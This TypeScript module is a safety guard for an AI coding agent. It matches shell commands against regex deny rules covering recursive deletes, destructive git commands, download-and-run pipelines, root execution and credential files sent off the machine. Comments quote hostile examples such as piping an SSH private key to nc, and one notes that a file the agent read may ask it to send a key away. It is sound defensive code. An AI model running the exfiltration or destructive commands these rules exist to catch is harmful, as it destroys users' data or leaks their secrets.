import type { Decision } from "../../decision.ts";
import { toolRisk } from "../../decisions/tool-risk.ts";
import { say } from "../../language.ts";
import { environmentSecrets, holdsCredential, redactSecrets } from "../../redact.ts";
import { subAgentUserGoal } from "../../swarm/brief.ts";
import { clip, failOpen, type KyrnRuntime } from "../runtime.ts";
import { SHELL_TOOLS } from "../shell-tools.ts";

/**
 * Inline code handed to an interpreter that reads its input, as `| python3 -c '…'` does: the download is the data the
 * code works on, not a script it runs. Perl's and Ruby's `-ne`, `-pe` are inline code too; Perl's `-p` alone is not.
 */
const INLINE_CODE = String.raw`(?:python[\d.]*\s+-[a-zA-Z]*c|perl\s+-[a-zA-Z]*[eE]|ruby\s+-[a-zA-Z]*e|node\s+(?:-[a-zA-Z]*[ep]|--eval|--print))\s`;
/**
 * What in inline code would run what it reads after all: `exec(sys.stdin.read())`, `os.system`, Ruby's `instance_eval`,
 * Node's `vm` or `import()`, a file read as `/dev/stdin`, or the input made into the code itself, as `"$(cat)"` does.
 */
const RUNS_INPUT = String.raw`[\s\S]*(?:\b(?:exec|system|popen|spawn|subprocess|child_process|runpy|pickle|marshal|Function|qx|vm\b|import\s*\()|eval|\/dev\/(?:stdin|fd\/)|\$\(|\x60|%x)`;

const RULES: readonly (readonly [RegExp, string])[] = [
	// Recursive only: `rm -f file` removes no more than `rm file`. `-r` may come after a file name, and GNU takes `--rec`
	// for `--recursive`. `docker run --rm` is no `rm`.
	[/(?<![-\w.])rm\s(?:[^|;&\n]*\s)?(?:-[a-zA-Z]*[rR][a-zA-Z]*|--r[a-z]*)(?=[\s;&|)]|$)/, "recursive or forced delete"],
	// find deletes what it finds with -delete, or with rm run on each.
	[/\bfind\b[^|;&\n]*\s-(?:delete\b|(?:exec|execdir|ok|okdir)\s+(?:\S*\/)?rm\b)/, "recursive or forced delete"],
	[
		/\bgit\s+(reset\s+--hard|clean\s+-[a-zA-Z]*f|checkout\s+--\s|branch\s+-D|stash\s+(drop|clear))/,
		"discards git work",
	],
	// The same deeds spelled otherwise: clean forced by a later option, a checkout of everything or by force, a
	// restore of the working tree, a branch deleted by force.
	[
		/\bgit\s+(?:clean\b[^|;&\n]*\s(?:-[a-zA-Z]*f|--force)\b|checkout\s+(?:\.(?:\s|$)|-f\b|--force\b)|restore\b(?:(?![^|;&\n]*--staged)|(?=[^|;&\n]*(?:--worktree|\s-W\b)))|branch\b[^|;&\n]*(?:--delete\s+--force|--force\s+--delete|\s-(?:D|df|fd)\b))/,
		"discards git work",
	],
	[/\bgit\s+push\b.*(--force|\s-f\b)/, "force push"],
	// A `+` refspec forces as well; --mirror, --delete and `:branch` remove what is on the remote.
	[/\bgit\s+push\b[^|;&\n]*\s(?:\+\S|--mirror\b|--delete\b|-d\b|:\S)/, "force push"],
	[/\b(drop|truncate)\s+(table|database|schema)\b/i, "drops database objects"],
	[/\bmkfs\b|\bdd\b.*\bof=\/dev\//, "overwrites a device"],
	[/\bchmod\s+-R\s+0?777\b/, "loosens permissions recursively"],
	// The same deeds in PowerShell and cmd.
	// A single dash: `rm --force` is the POSIX `rm -f`, which the first rule leaves alone.
	[
		/(?<![-\w.])(Remove-Item|rm|ri|del|erase|rd|rmdir)\b[^|;&\n]*\s(-Recurse|-Force|-r\b|-rf\b|\/s\b|\/q\b)/i,
		"recursive or forced delete",
	],
	[
		/\b(Invoke-Expression|iex)\b[^|;\n]*\b(Invoke-WebRequest|iwr|Invoke-RestMethod|irm|curl|wget|DownloadString)\b|\b(Invoke-WebRequest|iwr|Invoke-RestMethod|irm|curl|wget)\b[^|;\n]*\|\s*(Invoke-Expression|iex)\b/i,
		"runs a downloaded script",
	],
	[/\bStart-Process\b[^|;\n]*-Verb\s+RunAs\b|\brunas\b/i, "runs as administrator"],
	[/\bformat\s+[a-z]:|\bFormat-Volume\b|\bClear-Disk\b/i, "overwrites a device"],
	// A download piped into a shell or an interpreter that runs what it reads.
	[
		new RegExp(
			String.raw`\b(?:curl|wget)\b[^|;&]*\|\s*(?:sudo\s+)?(?!${INLINE_CODE}(?!${RUNS_INPUT}))(?:(?:ba|z|da|k)?sh|python[\d.]*|perl|ruby|node)\b`,
		),
		"runs a downloaded script",
	],
	// Without a pipe: a download read as a file (`bash <(curl …)`) or as the text of `sh -c "$(curl …)"`.
	[/<\(\s*(?:curl|wget)\b|\b(?:ba|z|da|k)?sh\s+-c\s+["']?\$\(\s*(?:curl|wget)\b/, "runs a downloaded script"],
	[/\b(?:sudo|doas|pkexec)\b/, "runs as root"],
];

/**
 * The command as the shell reads its words: `r\m` is `rm`, and so are `"rm"` and `r''m`. Only for matching the rules,
 * which also see the command as it was written.
 */
function unquoted(command: string): string {
	return command.replace(/\\(?=[A-Za-z])/g, "").replace(/(["'])([^"'\s]*)\1/g, "$2");
}

/**
 * The flag of a call that carries a credential (`carriesCredential`). No judge is asked about it: a page or a file the
 * agent read can ask for exactly this, and a judge that believed it would send the key away.
 */
export const SENDS_CREDENTIAL = "sends a credential";

/** Tools that only read or change files here: whatever they are given stays on this computer. */
const LOCAL_TOOLS: ReadonlySet<string> = new Set([
	"read",
	"write",
	"edit",
	"grep",
	"find",
	"ls",
	"todo",
	"remember",
	"sg_rewrite",
	"apply_patch_from",
]);

/** Every string in a JSON value. */
function strings(value: unknown): string[] {
	if (typeof value === "string") return [value];
	if (Array.isArray(value)) return value.flatMap(strings);
	if (value && typeof value === "object") return Object.values(value).flatMap(strings);
	return [];
}

/** Where a word of a command ends. */
const END = String.raw`(?=$|[\s'"),;|&>])`;
/**
 * Files that hold credentials, as a command names them: ssh's private keys and the folder that keeps them, the logins
 * of cloud tools, package registries and git, `.env` files, private keys and certificates with their keys. A public
 * key, ssh's other files (`config`, `known_hosts`, a control socket) and an example `.env` hold none.
 */
const CREDENTIAL_FILE = new RegExp(
	String.raw`(?:^|[\s'"=@<>:(\\/])(?:` +
		[
			String.raw`\.ssh(?:[\\/](?:id_[\w.-]+(?<!\.pub)|[\w.-]*(?:[_.]key|\.pem)))?[\\/]?`,
			String.raw`\.aws[\\/](?:credentials|config)`,
			String.raw`\.config[\\/]gh[\\/]hosts\.ya?ml`,
			String.raw`\.config[\\/]gcloud[\\/][^\s'"),;|&>]*`,
			String.raw`\.azure[\\/][^\s'"),;|&>]*`,
			String.raw`\.kube[\\/]config`,
			String.raw`\.docker[\\/]config\.json`,
			"[._]netrc",
			String.raw`\.npmrc`,
			String.raw`\.pypirc`,
			String.raw`\.git-credentials`,
			String.raw`\.env(?:\.(?!(?:example|sample|template|dist)${END})[\w-]+)?`,
			"id_(?:rsa|dsa|ecdsa|ed25519)",
			String.raw`[\w.-]+\.(?:pem|p12|pfx)`,
		].join("|") +
		`)${END}`,
	"i",
);
/** Programs that send something off this computer: transfer tools, a raw socket, uploads to a host or a service. */
const SENDS_AWAY =
	/(?:^|[\s;&|(`'"/])(?:curl|wget|nc|ncat|netcat|socat|scp|sftp|rsync|ftp|tftp|telnet|ssh|rclone|gsutil|aws\s+s3|gh\s+(?:gist|api|issue|pr|release)|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)(?=\s|$)|\/dev\/(?:tcp|udp)\//i;
/**
 * Options whose file the program uses to connect, rather than sends: a key or certificate it signs in with (`ssh -i`,
 * `curl --cert`), what it checks the other side against, ssh's control socket.
 */
const CONNECTS_WITH =
	/(?:^|\s)(?:-i|-E|-S|--key|--cert|--cacert|--capath|--identity-file|--private-key|-o\s*(?:IdentityFile|CertificateFile|ControlPath|UserKnownHostsFile))(?:\s*=\s*|\s+)?(?:"[^"]*"|'[^']*'|\S+)/g;
/**
 * The text of a heredoc fed to `cat` or `tee` with its end word quoted (`<<'EOF'`): written out as it is, nothing in it
 * runs, so a file it names is not read. Unquoted, `$(cat ~/.ssh/id_rsa)` in it would be.
 */
const WRITTEN_TEXT = /(\b(?:cat|tee)\b[^\n]*?<<-?[ \t]*(['"])([\w-]+)\2[^\n]*)\n[\s\S]*?\n[ \t]*\3[ \t]*(?=\n|$)/g;

/**
 * Whether a command sends a credential file away: it names one (`CREDENTIAL_FILE`) and runs a program that sends
 * something off this computer (`SENDS_AWAY`). `curl -d @.env https://…` and `cat ~/.ssh/id_rsa | nc host 9000` carry no
 * secret in their words, so the value check cannot see them. A file given to an option that signs in with it
 * (`ssh -i`, `curl --cert`) is not sent, nor is one named in text written out to a file. A tripwire, not a proof: a
 * program the command runs can still read the file.
 */
export function sendsCredentialFile(command: string): boolean {
	const run = command.replace(WRITTEN_TEXT, "$1");
	return SENDS_AWAY.test(run) && CREDENTIAL_FILE.test(run.replace(CONNECTS_WITH, " "));
}

/**
 * Whether a call would carry a credential to wherever it goes: one of this process's own (`environmentSecrets`: the
 * model providers' and the judge's keys, those from mu's `.env`), or a value only a secret looks like, anywhere in its
 * input, or a command that sends a credential file away (`sendsCredentialFile`). `curl -H "Authorization: Bearer
 * $GH_TOKEN"` names a variable and carries nothing; the key written out does. A tool that only works on files here
 * carries nothing away.
 */
export function carriesCredential(
	toolName: string,
	input: unknown,
	known: readonly string[] = environmentSecrets(),
): boolean {
	if (LOCAL_TOOLS.has(toolName)) return false;
	if (strings(input).some((text) => holdsCredential(text, known))) return true;
	const command = typeof input === "object" && input !== null ? (input as { command?: unknown }).command : undefined;
	return COMMAND_TOOLS.has(toolName) && typeof command === "string" && sendsCredentialFile(command);
}

/** What each flag says to a person reading Chinese. The judge and the model read the English. */
export const FLAG_ZH: Readonly<Record<string, string>> = {
	"recursive or forced delete": "递归或强制删除",
	"discards git work": "丢弃 git 里的改动",
	"force push": "强制推送",
	"drops database objects": "删除数据库对象",
	"overwrites a device": "覆盖整个设备",
	"loosens permissions recursively": "递归放开权限",
	"runs a downloaded script": "运行下载来的脚本",
	"runs as administrator": "以管理员身份运行",
	"runs as root": "以 root 身份运行",
	[SENDS_CREDENTIAL]: "把凭据发出去",
};

/** Each flag as a stable code, for a client that translates it into a language mu has no wording for. */
export const FLAG_CODES: Readonly<Record<string, string>> = {
	"recursive or forced delete": "recursive_or_forced_delete",
	"discards git work": "discards_git_work",
	"force push": "force_push",
	"drops database objects": "drops_database_objects",
	"overwrites a device": "overwrites_device",
	"loosens permissions recursively": "opens_permissions_recursively",
	"runs a downloaded script": "runs_downloaded_script",
	"runs as administrator": "runs_as_administrator",
	"runs as root": "runs_as_root",
	[SENDS_CREDENTIAL]: "sends_credential",
};

/** Tools whose `command` is a shell command line. A command is no safer for running in the background. */
const COMMAND_TOOLS: ReadonlySet<string> = new Set([...SHELL_TOOLS, "bg_start"]);

/** The file a word names, as a download names it too: the last part of a path or an address. */
const fileName = (word: string): string =>
	word
		.replace(/[?#].*$/, "")
		.split("/")
		.filter(Boolean)
		.at(-1) ?? "";

/**
 * A download saved to a file and run later in the same command: `curl -fsSLo i.sh URL && sh i.sh`, `wget URL/i.sh;
 * bash i.sh`, `curl -O URL/x.sh && chmod +x x.sh && ./x.sh`. The file is known by its name: an argument of the
 * download (`-o i.sh`, `> i.sh`) or the last part of its address.
 */
function runsSavedDownload(command: string): boolean {
	const saved = new Set<string>();
	for (const part of command.split(/&&|\|\||[;|\n]/)) {
		const words = part
			.trim()
			.split(/\s+/)
			.map((word) => word.replace(/^['"<>]+|['"]+$/g, ""))
			.filter((word) => word && word !== "sudo");
		const [program, ...rest] = words;
		if (program === undefined) continue;
		if (/^(?:curl|wget)$/.test(program)) {
			for (const word of rest) if (!word.startsWith("-")) saved.add(fileName(word));
			continue;
		}
		if (saved.size === 0) continue;
		// A file run by a shell or an interpreter, sourced, made runnable, or run by its path.
		const run = /^(?:(?:ba|z|da|k)?sh|python[\d.]*|perl|ruby|node|source|\.|chmod)$/.test(program)
			? rest.find((word) => !word.startsWith("-") && !/^[ugoa]*[+=][rwxX]+$|^[0-7]{3,4}$/.test(word))
			: program.includes("/")
				? program
				: undefined;
		if (run !== undefined && saved.has(fileName(run))) return true;
	}
	return false;
}

/** Whether the judge read the whole state: a judge with a bounded window says when it cut the rest (`state_truncated`). */
export function readWhole(decision: Decision<unknown>): boolean {
	return !decision.warnings?.some((warning) => warning.type === "state_truncated");
}

/** Why a shell command deserves a second look, or undefined when no rule matches. */
export function riskFlag(command: string): string | undefined {
	const plain = unquoted(command);
	const flag = RULES.find(([pattern]) => pattern.test(command) || pattern.test(plain))?.[1];
	return flag ?? (runsSavedDownload(plain) ? "runs a downloaded script" : undefined);
}

/**
 * The longest flagged command the judge is asked about, whole. Not longer: amid hundreds of harmless lines the judge
 * loses what the user did and did not ask for. On 36 dev scenarios hidden in read-only commands from real sessions
 * (1,500 to 16,000 characters), the whole script up to 8,000 cost about a third more than an excerpt of its start and
 * flagged parts, and more false allows. Nor an excerpt: the judge would vouch for the parts it read, and the parts it
 * did not read would run too (`npm publish` between two flagged lines). A longer command is the user's to confirm.
 */
export const RISK_COMMAND_CHARS = 1500;
/** How much of a long flagged command the person asked to confirm it reads (`riskExcerpt`). */
export const RISK_CONFIRM_CHARS = 1500;

/**
 * A command as a judge reads it whole: spaces run together and blank lines go, but line breaks stay. In a script each
 * one ends a command, and run into one line `echo done` and the `rm -rf build` under it read as one echo.
 */
export function commandLines(command: string): string {
	return command
		.split(/\r\n?|\n/)
		.map((line) => line.replace(/\s+/g, " ").trim())
		.filter(Boolean)
		.join("\n");
}

/**
 * A flagged command as the person asked to confirm it reads it: whole when it fits in `limit`, else its start and
 * every part a rule matched, with some text on each side, in order and joined by "…". Cut at a fixed length instead,
 * a long script whose `rm -rf` came late read as harmless: nobody can weigh a flag they cannot see. Each
 * rule that matched keeps at least one part even past `limit`. A rule that only matches the command as the shell
 * reads its words (`r''m -rf`) has the excerpt taken from those words. Lines as in `commandLines`.
 */
export function riskExcerpt(command: string, limit = RISK_COMMAND_CHARS): string {
	const whole = commandLines(command);
	if (whole.length <= limit) return whole;
	const plain = unquoted(command);
	const source = RULES.some(([pattern]) => !pattern.test(command) && pattern.test(plain)) ? plain : command;
	const around = Math.floor(limit / 12);
	const clamp = ([start, end]: readonly [number, number]): [number, number] => [
		Math.max(start, 0),
		Math.min(end, source.length),
	];
	// Per rule, the parts around its matches in order; a long match (find … -delete) shows both its ends.
	const byRule = RULES.map(([pattern]) =>
		[...source.matchAll(new RegExp(pattern.source, `${pattern.flags.replace("g", "")}g`))].flatMap((match) => {
			const start = match.index;
			const end = start + match[0].length;
			return end - start > 4 * around
				? [clamp([start - around, start + around]), clamp([end - around, end + around])]
				: [clamp([start - around, end + around])];
		}),
	);
	const size = ([start, end]: [number, number]) => end - start;
	// The start of the command and the first part of each rule always stay; the others while they fit, in order.
	const kept = [clamp([0, 2 * around]), ...byRule.flatMap((parts) => parts.slice(0, 1))];
	let used = kept.reduce((sum, part) => sum + size(part), 0);
	const rest = byRule.flatMap((parts) => parts.slice(1)).sort((a, b) => a[0] - b[0]);
	let left = 0;
	for (const part of rest) {
		if (used + size(part) > limit) left++;
		else {
			kept.push(part);
			used += size(part);
		}
	}
	const spans = kept
		.sort((a, b) => a[0] - b[0])
		.reduce<[number, number][]>((merged, span) => {
			const last = merged[merged.length - 1];
			if (last && span[0] <= last[1]) last[1] = Math.max(last[1], span[1]);
			else merged.push([...span]);
			return merged;
		}, []);
	const text = spans
		.map(([start, end]) => `${start > 0 ? "… " : ""}${commandLines(source.slice(start, end))}`)
		.join(" ");
	const tail = spans[spans.length - 1][1] < source.length ? " …" : "";
	return `${text}${tail}${left > 0 ? ` (${left} more flagged parts left out)` : ""}`;
}

/**
 * B3: rules pick the commands, the judge says whether the user asked for it,
 * and only an unvouched-for command reaches the user as a confirmation. The
 * judge can add a gate, never open one: no verdict means the user is asked.
 */
export function registerGuard(runtime: KyrnRuntime): void {
	const options = runtime.options("guard", { enabled: true });
	if (!options.enabled) return;

	runtime.pi.on(
		"tool_call",
		failOpen(async (event, ctx) => {
			runtime.touch(ctx);
			// With permission modes on, the flags are theirs to weigh: full access asks nothing, the others ask once.
			if (runtime.permissionMode) return undefined;
			if (!COMMAND_TOOLS.has(event.toolName)) return undefined;
			const command = String((event.input as { command?: unknown }).command ?? "");
			const flag = carriesCredential(event.toolName, event.input) ? SENDS_CREDENTIAL : riskFlag(command);
			if (!flag) return undefined;

			// In a sub-agent the message is what the parent's model wrote: only the user's goal says what was asked for.
			const asked = subAgentUserGoal() ?? runtime.turn.userMessage;
			// The judge vouches only for what it read, and a command too long to read whole runs whole: the user confirms it.
			// Nor does it vouch for a credential leaving.
			if (flag !== SENDS_CREDENTIAL && commandLines(command).length <= RISK_COMMAND_CHARS) {
				const decision = await runtime.engine.decide(
					toolRisk,
					{ command: commandLines(command), userMessage: clip(asked, 400), flag },
					{ signal: ctx.signal },
				);
				// Off and shadow leave pi's own behavior alone; only an active gate may stop a command.
				if (decision.mode !== "active" || (decision.outcome === "allow" && readWhole(decision))) return undefined;
			} else if (runtime.mode(toolRisk.id) !== "active") return undefined;
			if (!ctx.hasUI)
				return { block: true, reason: `mu: "${flag}" needs confirmation, which this mode cannot ask for.` };
			const shown = flag === SENDS_CREDENTIAL ? redactSecrets(command, environmentSecrets()) : command;
			const approved = await ctx.ui.confirm(
				`mu: ${say({ zh: FLAG_ZH[flag] ?? flag, en: flag })}`,
				`${say({ zh: "要运行这条命令吗？", en: "Run this command?" })}\n\n${riskExcerpt(shown, RISK_CONFIRM_CHARS)}`,
			);
			return approved ? undefined : { block: true, reason: `The user declined this command (${flag}).` };
		}),
		{ final: true },
	);
}
